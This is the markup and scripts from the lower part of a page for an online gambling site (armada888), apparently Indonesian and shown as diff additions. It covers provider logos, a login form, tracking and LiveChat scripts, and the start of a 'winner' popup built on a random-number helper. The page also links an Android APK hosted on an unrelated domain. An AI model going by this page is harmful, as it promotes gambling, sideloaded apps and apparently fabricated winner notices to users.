+                <img alt="Joker Gaming" title="Joker Gaming" src="https://images.linkcdn.cloud/global/logo-footer/slot/jok_footer.png" width="100" height="50" />
+                <img alt="WONWON" title="WONWON" src="https://images.linkcdn.cloud/global/logo-footer/slot/won_footer.webp" width="100" height="50" />
+                <img alt="GB Game" title="GB Game" src="https://images.linkcdn.cloud/global/logo-footer/slot/hcg_footer.png" width="100" height="50" />
+                <img alt="BESOFT" title="BESOFT" src="https://images.linkcdn.cloud/global/logo-footer/slot/bsf_footer.webp" width="100" height="50" />
+                <img alt="Playstar" title="Playstar" src="https://images.linkcdn.cloud/global/logo-footer/slot/pls_footer.png" width="100" height="50" />
+                <img alt="NoLimit City" title="NoLimit City" src="https://images.linkcdn.cloud/global/logo-footer/slot/nlc_footer.png" width="100" height="50" />
+                <img alt="RED TIGER" title="RED TIGER" src=" https://images.linkcdn.cloud/global/logo-footer/slot/rtr_footer.webp " width="100" height="50" />
+                <img alt="CQ9 Gaming" title="CQ9 Gaming" src="https://images.linkcdn.cloud/global/logo-footer/slot/cq9_footer.png" width="100" height="50" />
+                <img alt="Fa Chai" title="Fa Chai" src="https://images.linkcdn.cloud/global/logo-footer/slot/fac_footer.webp" width="100" height="50" />
+                <img alt="YGR Slot" title="YGR Slot" src="https://images.linkcdn.cloud/global/logo-footer/slot/ygr_footer.webp" width="100" height="50" />
+                <img alt="HG5" title="HG5" src="https://images.linkcdn.cloud/global/logo-footer/slot/hg5_footer.webp" width="100" height="50" />
+                <img alt="RICH88" title="RICH88" src="https://images.linkcdn.cloud/global/logo-footer/slot/r88_footer.webp" width="100" height="50" />
+                <img alt="SLOT4D" title="SLOT4D" src="https://images.linkcdn.cloud/global/logo-footer/slot/s4d_footer.webp" width="100" height="50" />
+                <img alt="JILI" title="JILI" src="https://images.linkcdn.cloud/global/logo-footer/slot/jli_footer.webp" width="100" height="50" />
+                <img alt="5G GAMES" title="5G GAMES" src="https://images.linkcdn.cloud/global/logo-footer/slot/5gs_footer.webp" width="100" height="50" />
+                <img alt="MIMI GAMING" title="MIMI GAMING" src="https://images.linkcdn.cloud/global/logo-footer/slot/mmg_footer.webp" width="100" height="50" />
+                <img alt="JDB" title="JDB" src="https://images.linkcdn.cloud/global/logo-footer/slot/jdb_footer.webp" width="100" height="50" />
+                <img alt="Habanero" title="Habanero" src="https://images.linkcdn.cloud/global/logo-footer/slot/hbn_footer.png" width="100" height="50" />
+                <img alt="Hydako" title="Hydako" src="https://images.linkcdn.cloud/global/logo-footer/slot/hyd_footer.png" width="100" height="50" />
+                <img alt="FUNKY GAMES" title="FUNKY GAMES" src="https://images.linkcdn.cloud/global/logo-footer/slot/net_footer.webp" width="100" height="50" />
+                <img alt="WOW GAMING" title="WOW GAMING" src="https://images.linkcdn.cloud/global/logo-footer/slot/wow_footer.webp" width="100" height="50" />
+              </div>
+            </div>
+            <div class="provider-content">
+              <div class="provider-title">
+                <img title="Casino" alt="Casino" src="https://images.linkcdn.cloud/global/icon-footer/Casino.png" width="20" height="20" />
+                <span>                CASINO
+</span>
+              </div>
+              <div class="provider-logo">
+                <img alt="Pragmatic Play LC" title="Pragmatic Play LC" src="https://images.linkcdn.cloud/global/logo-footer/casino/plc_footer.png" width="100" height="50" />
+                <img alt="Sexy Gaming" title="Sexy Gaming" src="https://images.linkcdn.cloud/global/logo-footer/casino/seg_footer.png" width="100" height="50" />
+                <img alt="MICROGAMING LC" title="MICROGAMING LC" src="https://images.linkcdn.cloud/global/logo-footer/casino/mlc_footer.webp" width="100" height="50" />
+                <img alt="Playtech Casino" title="Playtech Casino" src="https://images.linkcdn.cloud/global/logo-footer/casino/pca_footer.png" width="100" height="50" />
+                <img alt="Evolution" title="Evolution" src="https://images.linkcdn.cloud/global/logo-footer/casino/evolution_footer.webp" width="100" height="50" />
+                <img alt="AFB CASINO" title="AFB CASINO" src="https://images.linkcdn.cloud/global/logo-footer/casino/afc_footer.webp" width="100" height="50" />
+                <img alt="PLAYACE" title="PLAYACE" src="https://images.linkcdn.cloud/global/logo-footer/casino/agc_footer.png" width="100" height="50" />
+                <img alt="OG Casino" title="OG Casino" src="https://images.linkcdn.cloud/global/logo-footer/casino/ogs_footer.png" width="100" height="50" />
+                <img alt="GD88" title="GD88" src="https://images.linkcdn.cloud/global/logo-footer/casino/gd8_footer.png" width="100" height="50" />
+                <img alt="ALLBET" title="ALLBET" src="https://images.linkcdn.cloud/global/logo-footer/casino/alb_footer.png" width="100" height="50" />
+                <img alt="Dream Gaming" title="Dream Gaming" src="https://images.linkcdn.cloud/global/logo-footer/casino/drg_footer.png" width="100" height="50" />
+                <img alt="AI CASINO" title="AI CASINO" src="https://images.linkcdn.cloud/global/logo-footer/casino/aic_footer.webp" width="100" height="50" />
+                <img alt="LG88" title="LG88" src="https://images.linkcdn.cloud/global/logo-footer/casino/lg8_footer.png" width="100" height="50" />
+              </div>
+            </div>
+            <div class="provider-content">
+              <div class="row">
+                <div class="col-lg-6">
+                  <div class="provider-title">
+                    <img title="Sportsbook" alt="Sportsbook" src="https://images.linkcdn.cloud/global/icon-footer/Sport.png" width="20" height="20" />
+                    <span>                    SPORTSBOOK
+</span>
+                  </div>
+                  <div class="provider-logo">
+                    <img alt="AFB88" title="AFB88" src="https://images.linkcdn.cloud/global/logo-footer/sports/afb_footer.png" width="100" height="50" />
+                    <img alt="BTI Sportsbook" title="BTI Sportsbook" src="https://images.linkcdn.cloud/global/logo-footer/sports/bti_footer.webp" width="100" height="50" />
+                    <img alt="SBO SPORT" title="SBO SPORT" src="https://images.linkcdn.cloud/global/logo-footer/sports/sbo_footer.png" width="100" height="50" />
+                    <img alt="CMD368" title="CMD368" src="https://images.linkcdn.cloud/global/logo-footer/sports/cmd_footer.png" width="100" height="50" />
+                    <img alt="SABA SPORT" title="SABA SPORT" src="https://images.linkcdn.cloud/global/logo-footer/sports/sab_footer.webp" width="100" height="50" />
+                    <img alt="OPUS Sports" title="OPUS Sports" src="https://images.linkcdn.cloud/global/logo-footer/sports/m88_footer.webp" width="100" height="50" />
+                    <img alt="IA E-SPORT" title="IA E-SPORT" src="https://images.linkcdn.cloud/global/logo-footer/sports/iae_footer.png" width="100" height="50" />
+                  </div>
+                </div>
+                <div class="col-lg-6">
+                  <div class="provider-title">
+                    <img title="Arcade" alt="Arcade" src="https://images.linkcdn.cloud/global/icon-footer/Arcade.png" width="20" height="20" />
+                    <span>                    ARCADE
+</span>
+                  </div>
+                  <div class="provider-logo">
+                    <img alt="Pragmatic Crash Game" title="Pragmatic Crash Game" src="https://images.linkcdn.cloud/global/logo-footer/casino/spaceman_footer.webp" width="100" height="50" />
+                    <img alt="FUNKY GAMES" title="FUNKY GAMES" src="https://images.linkcdn.cloud/global/logo-footer/slot/fun_footer.webp" width="100" height="50" />
+                    <img alt="Joker Gaming" title="Joker Gaming" src="https://images.linkcdn.cloud/global/logo-footer/slot/jok_footer.png" width="100" height="50" />
+                    <img alt="SPRIBE" title="SPRIBE" src="https://images.linkcdn.cloud/global/logo-footer/slot/spr_footer.webp" width="100" height="50" />
+                    <img alt="Fastspin" title="Fastspin" src="https://images.linkcdn.cloud/global/logo-footer/slot/fastspin_footer.png" width="100" height="50" />
+                    <img alt="JDB" title="JDB" src="https://images.linkcdn.cloud/global/logo-footer/slot/jdb_footer.webp" width="100" height="50" />
+                    <img alt="JILI" title="JILI" src=" https://images.linkcdn.cloud/global/logo-footer/slot/jli_footer.webp " width="100" height="50" />
+                    <img alt="WONWON" title="WONWON" src=" https://images.linkcdn.cloud/global/logo-footer/slot/won_footer.webp " width="100" height="50" />
+                    <img alt="Fa Chai" title="Fa Chai" src="https://images.linkcdn.cloud/global/logo-footer/slot/fac_footer.webp" width="100" height="50" />
+                    <img alt="Spade Gaming" title="Spade Gaming" src="https://images.linkcdn.cloud/global/logo-footer/slot/spd_footer.png" width="100" height="50" />
+                    <img alt="HG5" title="HG5" src="https://images.linkcdn.cloud/global/logo-footer/slot/hg5_footer.webp" width="100" height="50" />
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="provider-content">
+              <div class="row">
+                <div class="col-lg-3">
+                  <div class="provider-title">
+                    <img title="Live Game" alt="Live Game" src="https://images.linkcdn.cloud/global/icon-footer/Game Lain.png" width="20" height="20" />
+                    <span>                    LIVE GAME
+</span>
+                  </div>
+                  <div class="provider-logo">
+                    <img alt="GA28" title="GA28" src="https://images.linkcdn.cloud/global/logo-footer/others/ga2_footer.png" width="100" height="50" />
+                    <img alt="WS168" title="WS168" src="https://images.linkcdn.cloud/global/logo-footer/others/ws1_footer.webp" width="100" height="50" />
+                    <img alt="SV388 Cockfight" title="SV388 Cockfight" src="https://images.linkcdn.cloud/global/logo-footer/others/sv3_footer.png" width="100" height="50" />
+                    <img alt="MIKI Gaming" title="MIKI Gaming" src="https://images.linkcdn.cloud/global/logo-footer/others/mki_footer.png" width="100" height="50" />
+                    <img alt="CFA88" title="CFA88" src="https://images.linkcdn.cloud/global/logo-footer/sports/cfa_footer.webp" width="100" height="50" />
+                  </div>
+                </div>
+                <div class="col-lg-3">
+                  <div class="provider-title">
+                    <img title="Lottery" alt="Lottery" src="https://images.linkcdn.cloud/global/icon-footer/Lottery.png" width="20" height="20" />
+                    <span>                    LOTTERY
+</span>
+                  </div>
+                  <div class="provider-logo">
+                    <img alt="4D" title="4D" src="https://images.linkcdn.cloud/global/logo-footer/lottery/togel_footer.png" width="100" height="50" />
+                  </div>
+                </div>
+                <div class="col-lg-3">
+                  <div class="provider-title">
+                    <img title="Poker" alt="Poker" src="https://images.linkcdn.cloud/global/icon-footer/Poker.png" width="20" height="20" />
+                    <span>                    POKER
+</span>
+                  </div>
+                  <div class="provider-logo">
+                    <img alt="We1Poker" title="We1Poker" src="https://images.linkcdn.cloud/global/logo-footer/poker/we1_footer.png" width="100" height="50" />
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="provider-nav">
+            <a href="" class="provider-link">            +21
+</a>
+            <a href="/news" class="provider-link">            Berita
+</a>
+            <a href="/promotion" class="provider-link">            Promosi
+</a>
+            <a href="/help#About" class="provider-link">            Tentang Kami
+</a>
+            <a href="/contact" class="provider-link">            Kontak Kami
+</a>
+            <a href="/help" class="provider-link">            Persyaratan &amp; Ketentuan
+</a>
+            <a href="/help#FAQ" class="provider-link">            FAQ
+</a>
+          </div>
+        </div>
+      </div>
+      <div class="footer__trademark">
+        Copyright © 2021 - 2026 armada888 is an international registered trademark. All rights reserved.
+      </div>
+    </footer>
+    <div class="footer-mobile">
+      <a class="footer-item active" href="https://18xarmada888.shop">      <div class="footer-icon">
+        <i class="fas fa-home"></i>
+      </div>
+      <div class="footer-title">
+        Home
+      </div>
+</a>
+      <a class="footer-item" href="https://bright.moonlightcodex.us/ARMADA888.apk" target="_blank">      <div class="footer-icon">
+        <i class="fab fa-android"></i>
+      </div>
+      <div class="footer-title">
+        Apps
+      </div>
+</a>
+      <a class="footer-item footer-login" href="#" data-toggle="modal" data-target="#loginModal">      <div class="footer-icon">
+        <i class="fas fa-user-alt"></i>
+      </div>
+      <div class="footer-title">
+        Masuk
+      </div>
+</a>
+      <a class="footer-item " href="https://18xarmada888.shop/promotion">      <div class="footer-icon">
+        <i class="fas fa-tags"></i>
+        <i class="fas fa-percent"></i>
+      </div>
+      <div class="footer-title">
+        Promosi
+      </div>
+</a>
+      <a class="footer-item" target="_blank" rel="noreferrer" href="https://secure.livechatenterprise.com/licence/15472947/v2/open_chat.cgi?groups=0">      <div class="footer-icon">
+        <i class="fas fa-comments"></i>
+      </div>
+      <div class="footer-title">
+        Live Chat
+      </div>
+</a>
+    </div>
+    <!-- Modal -->
+    <div class="modal fade custom-popup" id="loginModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <i class="fas fa-times"></i>
+          </button>
+          <div class="modal-header">
+            <h5 class="modal-title" id="exampleModalLabel">
+              Formulir Login
+            </h5>
+          </div>
+          <div class="modal-body">
+            <div class="modal-body-form">
+              <form name="login-form">
+                <div class="form-item">
+                  <div class="item-title">
+                    Nama Pengguna*
+                  </div>
+                  <input value="" minlength="1" maxlength="25" name="usernameLogin" style="text-transform: lowercase" type="text" placeholder="Nama Pengguna*" autocomplete="off" required="" />
+                </div>
+                <div class="form-item">
+                  <div class="item-title">
+                    Kata Sandi*
+                  </div>
+                  <div class="position-relative">
+                    <input value="" minlength="5" maxlength="50" id="passwordLogin2" name="passwordLogin" type="password" placeholder="Kata Sandi*" autocomplete="off" required="" />
+                    <i class="toggle-password fas fa-eye-slash" toggle="#passwordLogin2" style="
+    position: absolute;
+    right:0.5rem;
+    top:50%;
+    transform:translateY(-50%);
+    cursor:pointer;
+    color:#808080;
+"></i>
+                  </div>
+                </div>
+                <div class="form-forgot">
+                  <a href="https://18xarmada888.shop/forgot-password">                  Lupa Kata Sandi ?
+</a>
+                </div>
+                <div class="form-button">
+                  <button name="buttonLogin" type="submit" class="button-login">
+                    Masuk
+                  </button>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js">
+    </script>
+    <script src="https://18xarmada888.shop/themes/default/js/vendor.js">
+    </script>
+    <script src="https://18xarmada888.shop/themes/default/js/global.js?v=2.0.1796">
+    </script>
+    <script src="https://18xarmada888.shop/themes/default/js/index.js?v=2.0.1796">
+    </script>
+    <script src="https://18xarmada888.shop/themes/default/vendor/jquery-validate/jquery.validate.min.js">
+    </script>
+    <script>
+      const getQueryParameter = (param) =&gt; new URLSearchParams(document.location.search.substring(1)).get(param)
+    const getAllQueryParameter = () =&gt; Object.fromEntries((new URLSearchParams(document.location.search).entries()))
+    const isValidUrl = (string) =&gt; {
+        try {
+            new URL(string)
+            return true
+        } catch (e) {
+            return false
+        }
+    }
+
+    function setQueryParameter(param, value) {
+        $(&#39;a[href]&#39;).attr(&#39;href&#39;, function(index, href) {
+            if (isValidUrl(href) &amp;&amp; href != &#39;javascript:;&#39;) {
+                let url = new URL(href)
+                url.searchParams.set(param, value)
+                return url
+            } else {
+                return href
+            }
+        });
+        
+        $(document).on(&#39;click&#39;, &#39;[onclick]&#39;, function (e) {
+            // ambil onclick asli
+            const onclick = $(this).attr(&#39;onclick&#39;);
+            // contoh: intercept window.location.href
+            const match = onclick.match(/window\.location\.href\s*=\s*[&#39;&#34;]([^&#39;&#34;]+)[&#39;&#34;]/);
+            if (match) {
+                e.preventDefault(); // stop onclick lama
+                let url = match[1];
+                // contoh: tambahkan parameter
+                const clickId = sessionStorage.getItem(param);
+                if (clickId &amp;&amp; !url.includes(param + &#39;=&#39;)) {
+                    url += (url.includes(&#39;?&#39;) ? &#39;&amp;&#39; : &#39;?&#39;) + param + &#39;=&#39; + encodeURIComponent(clickId);
+                }
+
+                window.location.href = url;
+            }
+        });
+    }
+    let par = window.location.search == &#39;&#39; ? sessionStorage : getAllQueryParameter()
+    $.each(par, function (key, val) {
+        if ($.inArray(key, [&#39;opera_click_id&#39;, &#39;fbclid&#39;, &#39;fb_clickid&#39;, &#39;ttclid&#39;, &#39;tt_clickid&#39;]) !== -1) {
+            if (sessionStorage.getItem(key) !== null) {
+                setQueryParameter(key, sessionStorage.getItem(key))
+                $(&#39;#register-form&#39;).append(`&lt;input type=&#34;hidden&#34; name=&#34;${key}&#34; value=&#34;${getQueryParameter(key)}&#34;&gt;`);
+            } else {
+                if (getQueryParameter(key) !== null) {
+                    setQueryParameter(key, getQueryParameter(key))
+                    $(&#39;#register-form&#39;).append(`&lt;input type=&#34;hidden&#34; name=&#34;${key}&#34; value=&#34;${getQueryParameter(key)}&#34;&gt;`);
+                    sessionStorage.setItem(key, getQueryParameter(key))
+                }
+            }
+        }
+    });
+    </script>
+    <script>
+      function numberAmount(number) {
+        let format = new Intl.NumberFormat(&#39;en-US&#39;, { maximumFractionDigits: 2 }).format(number)
+        return format.toString()
+    }
+    
+    window.addEventListener(&#34;popstate&#34;, (event) =&gt; {
+        location.reload();
+    });
+    
+    $(&#34;a[name=playGames]&#34;).on(&#34;click&#34;, function () {
+        fbq(&#39;trackCustom&#39;, &#34;PlayGame&#34;)
+        ttq.track(&#39;PlayGame&#39;);
+    });
+
+    $(&#34;a[name=locale-switch]&#34;).on(&#34;click&#34;, function () {
+        const locale = $(this).attr(&#39;data-locale&#39;)
+        $.ajax({
+            type: &#34;POST&#34;,
+            url: &#34;https://18xarmada888.shop/locale&#34;,
+            data: {
+                _token: &#34;J4RTU9n3mcVpTPqHnTVEw8UZTVO68XtXlIMTQhqs&#34;,
+                locale: locale,
+            },
+            success: function (res) {
+                if (res) {
+                    location.reload()
+                } else {
+                    Swal.fire({
+                        toast: true,
+                        position: &#39;top-end&#39;,
+                        icon: &#39;error&#39;,
+                        title: &#34;Locale not supported.&#34;
+                    });
+                }
+            }
+        });
+    });
+
+    $(&#39;.toggle-password&#39;).on(&#39;click&#39;, function (e) { 
+        e.preventDefault();
+        $(this).toggleClass(&#39;fa-eye-slash fa-eye&#39;)
+        const type = $(this).hasClass(&#39;fa-eye-slash&#39;) ? &#39;password&#39; : &#39;text&#39;
+        $($(this).attr(&#39;toggle&#39;)).attr(&#39;type&#39;, type)
+    });
+
+    
+    jQuery.validator.addMethod(&#34;numbers&#34;, function(value, element) {
+        return /[0-9]/.test(value);
+    }, &#34;Kata sandi harus memiliki minimal 1 angka. &#34;);
+
+    jQuery.validator.addMethod(&#34;letters&#34;, function(value, element) {
+        return /[a-z]/.test(value);
+    }, &#34;Kata sandi harus terdiri dari minimal 1 huruf. &#34;);
+
+    jQuery.validator.addMethod(&#34;contain&#34;, function(value, element, params) {
+        let username = $(params).val();
+        if (username &amp;&amp; value) {
+            return value.toLowerCase().indexOf(username.toLowerCase()) === -1;
+        }
+        return true;
+    }, &#34;Kata sandi tidak boleh mengandung nama pengguna. &#34;);
+    </script>
+    <script>
+      $(document).ready(function() {
+    $(this).scrollTop(0);
+    $.ajax({
+        type: &#34;POST&#34;,
+        url: &#34;https://18xarmada888.shop/paymentService&#34;,
+        data: { _token: &#34;J4RTU9n3mcVpTPqHnTVEw8UZTVO68XtXlIMTQhqs&#34;},
+        success: function (response) {
+            let wdTime = response.data.wd
+            let depoTime = response.data.depo
+            $(&#34;[id=withdrawTime]&#34;).text(wdTime)
+            $(&#34;[id=withdrawTimeBar]&#34;).attr(&#39;aria-valuenow&#39;, wdTime).width((wdTime / 15) * 100 + &#34;%&#34;)
+            $(&#34;[id=depositTime]&#34;).text(depoTime)
+            $(&#34;[id=depositTimeBar]&#34;).attr(&#39;aria-valuenow&#39;, depoTime).width((depoTime / 15) * 100 + &#34;%&#34;)
+        }
+    });
+            
+        
+                                    $(&#39;#homePopup&#39;).modal(&#39;show&#39;);
+                    
+                    });
+    $(&#39;#pageLoadingBar&#39;).hide()
+    window.onpopstate = function() {
+        let path = window.location.pathname;
+        routeNav(path);
+    }
+
+    function routeNav(path) {
+        let urlPar = &#39;&#39;
+        $.each(sessionStorage, function (key, val) { 
+            if ($.inArray(key, [&#39;opera_click_id&#39;, &#39;fbclid&#39;, &#39;fb_clickid&#39;, &#39;ttclid&#39;, &#39;tt_clickid&#39;]) !== -1) {
+                urlPar += (urlPar.includes(&#39;?&#39;) ? &#39;&amp;&#39; : &#39;?&#39;) + key + &#39;=&#39; + val;
+            }
+        });
+        path += urlPar
+        if (path == window.location.pathname) return;
+        history.pushState(null, null, path);
+        let url = &#34;https://18xarmada888.shop&#34; + window.location.pathname;
+        if (path == &#39;/&#39;) {
+            window.location.replace(&#34;https://18xarmada888.shop&#34;)
+            return false;
+        }
+        $(&#34;.header-form&gt;a&#34;).removeClass(&#39;active&#39;)
+		let elem = document.getElementById(&#34;pageLoadingBar&#34;);
+		let width = 1;
+        $.ajax({
+            type: &#34;GET&#34;,
+            url: url,
+			beforeSend: () =&gt; {
+				$(&#39;#pageLoadingBar&#39;).show()
+				let id = setInterval(frame, 100);
+				function frame() {
+					if (width &gt;= 100) {
+						clearInterval(id);
+					} else {
+						width++;
+						elem.style.width = width + &#39;%&#39;;
+					}
+				}
+			},
+            success: function (page) {
+				width = 100;
+				elem.style.width = width + &#39;%&#39;;
+                $(&#34;main[id=main-route]&#34;).empty().append(page);
+                $(&#34;title&#34;).text($(&#34;#title-seo&#34;).text());
+                const script = $(&#34;scope-script&#34;).html()
+                $(&#34;scope-script&#34;).remove()
+                setTimeout(() =&gt; {
+                    $(&#34;html, body&#34;).animate({ scrollTop: &#34;0&#34; }, 1000);
+				    $(&#39;#pageLoadingBar&#39;).hide()
+				    elem.style.width = &#39;1%&#39;;
+                    $(&#34;custom-script&#34;).empty().append(script);
+                    filterGameSelection(&#39;all&#39;)
+                }, 500);
+            }
+        });
+    }
+    </script>
+    <script>
+      $(window).scroll(function(e){ 
+    var $cls = $(&#39;.header-nav&#39;); 
+    var isPositionFixed = ($cls.css(&#39;position&#39;) == &#39;fixed&#39;);
+        if ($(this).scrollTop() &gt; 250 &amp;&amp; !isPositionFixed){ 
+            $cls.css({&#39;position&#39;: &#39;fixed&#39;, &#39;top&#39;: &#39;0px&#39;, &#39;width&#39;:&#39;100%&#39;}); 
+        }
+        if ($(this).scrollTop() &lt; 250 &amp;&amp; isPositionFixed){
+            $cls.css({&#39;position&#39;: &#39;sticky&#39;, &#39;top&#39;: &#39;0px&#39;}); 
+        } 
+    });
+    </script>
+    <script>
+      function maxInputAmount(wallet) {
+        const amountWd = $(&#34;#withdrawAmount&#34;)
+		const maxWd = parseFloat(amountWd.attr(&#39;max&#39;))
+		let walletAvail = parseFloat($(`#${wallet}Desc`).text())
+        walletAvail = isNaN(walletAvail) ? 0 : walletAvail;
+        if (walletAvail != 0) {
+            if (walletAvail &lt; maxWd) {
+                amountWd.attr(&#39;max&#39;, walletAvail)
+            }
+        }
+    }
+
+    window.showError = (title, message) =&gt; {
+        return Swal.fire({
+            icon: &#39;info&#39;,
+            title: title,
+            html: message,
+            timerProgressBar: true,
+            timer: 5000,
+        });
+    }
+
+    $(&#34;.game-search&gt;.form-control-sm&#34;).on(&#34;focus&#34;, function () {
+        if ($(this).val().length == 0) {
+            $(&#34;.game-search&#34;).width(&#39;100%&#39;);
+            $(&#34;.form-control-sm&#34;).width(&#39;100%&#39;);
+        }
+    })
+
+    $(&#34;.game-search&gt;.form-control-sm&#34;).on(&#34;focusout&#34;, function () {
+        if ($(this).val().length == 0) {
+            $(&#34;.game-search&#34;).width(&#39;&#39;);
+            $(&#34;.form-control-sm&#34;).width(&#39;&#39;);
+        }
+    })
+
+    
+    $(&#34;form[name=login-form]&#34;).on(&#39;submit&#39;, function(e) {
+        e.preventDefault();
+        let formData = {};
+        $.each($(this).serializeArray(), function (i, val) { 
+             formData[val.name] = val.value
+        });
+        formData.usernameLogin = formData.usernameLogin.replace(/\s/g, &#39;&#39;);
+        let btnTxt = $(&#34;button[name=buttonLogin]&#34;).html()
+        $.ajax({
+            url: &#34;https://18xarmada888.shop/doLogin&#34;,
+            type: &#39;POST&#39;,
+            data: {
+                _token: &#34;J4RTU9n3mcVpTPqHnTVEw8UZTVO68XtXlIMTQhqs&#34;,
+                username: formData.usernameLogin,
+                password: formData.passwordLogin
+            },
+            beforeSend: function() {
+                $(&#34;input[name=&#39;usernameLogin&#39;]&#34;).attr(&#39;readonly&#39;, true)
+                $(&#34;input[name=&#39;passwordLogin&#39;]&#34;).attr(&#39;readonly&#39;, true)
+                $(&#34;button[name=buttonLogin]&#34;).attr(&#39;disabled&#39;, true)
+                $(&#34;button[name=buttonLogin]&#34;).html(&#39;&lt;span class=&#34;spinner-border spinner-border-sm&#34; role=&#34;status&#34; aria-hidden=&#34;true&#34;&gt;&lt;/span&gt;&#39;);
+            },
+            success: function (data) {
+                window.history.replaceState(null, null, window.location.href);
+                if (data.code == 200) {
+	                fbq(&#39;track&#39;, &#39;Login&#39;);
+                    ttq.track(&#39;Login&#39;)
+                    const alert = {
+                        toast: true,
+                        position: &#39;top-end&#39;,
+                        icon: &#39;success&#39;,
+                        timer: 3000,
+                        title: data.message
+                    }
+                    localStorage.setItem(&#34;loginAlert&#34;, JSON.stringify(alert));
+                    location.reload();
+                } else {
+                    let msg = &#39;&#39;;
+                    $.each(data.errors, function (index, valueOfElement) { 
+                        msg += valueOfElement + &#39;&lt;br /&gt;&#39;
+                    });
+                    Swal.fire({
+                        toast: true,
+                        position: &#39;top-end&#39;,
+                        icon: &#39;error&#39;,
+                        title: (msg == &#39;&#39;) ? &#34;Mohon maaf atas ketidaknyamanannya, halaman ini akan dimuat ulang dalam 5 detik&#34; : msg
+                    });
+                    if (msg == &#39;&#39;) {
+                        location.reload();
+                    }
+                    $(&#34;input[name=&#39;usernameLogin&#39;]&#34;).removeAttr(&#39;readonly&#39;)
+                    $(&#34;input[name=&#39;passwordLogin&#39;]&#34;).removeAttr(&#39;readonly&#39;)
+                    $(&#34;input[name=&#39;passwordLogin&#39;]&#34;).val(&#39;&#39;)
+                    $(&#34;button[name=buttonLogin]&#34;).removeAttr(&#39;disabled&#39;)
+                    $(&#34;button[name=buttonLogin]&#34;).html(btnTxt)
+                }
+            },
+            error: function (data) {
+                if (data.statusText === &#39;timeout&#39;) {
+                location.reload();
+            } else {
+                let msg = &#39;&#39;;
+                $.each(data.responseJSON.errors, function (index, valueOfElement) { 
+                        msg += valueOfElement + &#39;&lt;br /&gt;&#39;
+                });
+                Swal.fire({
+                    toast: true,
+                    position: &#39;top-end&#39;,
+                    icon: &#39;error&#39;,
+                    title: (msg == &#39;&#39;) ? &#34;Mohon maaf atas ketidaknyamanannya, halaman ini akan dimuat ulang dalam 5 detik&#34; : msg
+                });
+                if (msg == &#39;&#39;) {
+                    location.reload();
+                }
+                $(&#34;input[name=&#39;usernameLogin&#39;]&#34;).removeAttr(&#39;readonly&#39;)
+                $(&#34;input[name=&#39;passwordLogin&#39;]&#34;).removeAttr(&#39;readonly&#39;)
+                $(&#34;input[name=&#39;usernameLogin&#39;]&#34;).val(&#39;&#39;)
+                $(&#34;input[name=&#39;passwordLogin&#39;]&#34;).val(&#39;&#39;)
+                $(&#34;button[name=buttonLogin]&#34;).removeAttr(&#39;disabled&#39;)
+                $(&#34;button[name=buttonLogin]&#34;).html(btnTxt)
+            }
+        }
+        });
+    });
+
+    function gameAlert() {
+        return Swal.fire({
+            icon: &#39;info&#39;,
+            title: &#34;Perhatian.&#34;,
+            html: &#34;Silakan login untuk bermain!&#34;,
+            timerProgressBar: true,
+            timer: 5000,
+        });
+    }
+    </script>
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script>
+      window._lc = window._lc || {};
+    window.__lc.license = 15472947;
+    window.__lc.integration_name = &#34;manual_channels&#34;;
+    window.__lc.product_name = &#34;livechat&#34;;
+    ;(function(n,t,c){function i(n){return e.h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:&#34;2.0&#34;,on:function(){i([&#34;on&#34;,c.call(arguments)])},once:function(){i([&#34;once&#34;,c.call(arguments)])},off:function(){i([&#34;off&#34;,c.call(arguments)])},get:function(){if(!e._h)throw new Error(&#34;[LiveChatWidget] You can&#39;t use getters before load.&#34;);return i([&#34;get&#34;,c.call(arguments)])},call:function(){i([&#34;call&#34;,c.call(arguments)])},init:function(){var n=t.createElement(&#34;script&#34;);n.async=!0,n.type=&#34;text/javascript&#34;,n.src=&#34;https://cdn.livechatinc.com/tracking.js&#34;,t.head.appendChild(n)}};!n._lc.asyncInit&amp;&amp;e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+    </script>
+    <noscript>
+      &lt;a href=&#34;https://www.livechat.com/chat-with/15472947/&#34; rel=&#34;nofollow&#34;&gt;Chat with us&lt;/a&gt;, powered by &lt;a href=&#34;https://www.livechat.com/?welcome&#34; rel=&#34;noopener nofollow&#34; target=&#34;_blank&#34;&gt;LiveChat&lt;/a&gt;
+    </noscript>
+    <!-- End of LiveChat code -->
+    <!-- Notif WD -->
+    <style>
+      .popup {
+          position: relative;
+          cursor: pointer;
+      }
+  
+           .popup .popuptext {
+            visibility: hidden;
+            width: 350px;
+            background-color: #000000;
+            color: White !important;
+            text-align: center;
+            border-radius: 4px;
+            padding: 4px 0;
+            position: fixed;
+            z-index: 9999;
+            top: 63px;
+            left: 100px;
+            margin-left: -80px;
+            font-size: 14px;
+            border: solid 2px #1E90FF;
+            box-shadow: 1px 1px 10px 5px #0F4C81;
+ 
+        }
+          .popup .show {
+          visibility: visible;
+          -webkit-animation: fadeinout 3s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards;
+          animation: fadeinout 3s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards;
+          ;
+      }
+  
+      #imageid {
+          float: left;
+          width: 15%;
+      }
+  
+      @-webkit-keyframes fadeinout {
+  
+          0%,
+          100% {
+              opacity: 0;
+          }
+  
+          50% {
+              opacity: 1;
+          }
+      }
+  
+      @keyframes fadeinout {
+  
+          0%,
+          100% {
+              opacity: 0;
+          }
+  
+          50% {
+              opacity: 1;
+          }
+      }
+  
+      @media only screen and (max-width: 600px) {
+          .popup .popuptext {
+              margin: unset;
+              top: 90px;
+              left: 50%;
+              transform: translate(-50%, -50%);
+          }
+      }
+    </style>
+    <div class="popup">
+      <div class="popuptext" id="myPopup">
+        <img id="imageid" />
+        <div id="winner-title">
+          <img id="imageid" />
+          <strong>          SELAMAT KEPADA
+</strong>
+        </div>
+        <div id="winner-info">
+        </div>
+      </div>
+    </div>
+    <script>
+      function getRandomInt(min, max) {
+          min = Math.ceil(min);
+          max = Math.floor(max);
